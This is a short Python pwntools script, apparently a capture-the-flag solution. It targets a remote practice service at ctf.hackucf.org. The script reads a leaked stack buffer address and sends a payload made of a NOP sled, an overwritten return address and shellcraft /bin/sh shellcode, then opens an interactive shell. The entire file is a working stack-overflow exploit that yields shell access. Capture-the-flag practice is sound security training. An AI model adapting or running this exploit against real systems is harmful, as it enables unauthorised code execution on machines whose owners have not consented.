from pwn import *

returnOffset = 63

# p = process('./stack0')
p = remote('ctf.hackucf.org', 32101)

p.recvuntil('= ')

bufferAddress = int(p.recvuntil('\n', drop=True), 16)

print hex(bufferAddress)

sc = asm(shellcraft.linux.sh())
payload = '\x90' * returnOffset
payload += p32(bufferAddress + returnOffset + 10)
payload += '\x90' * 100
payload += sc

p.sendline(payload)
p.interactive()
p.close()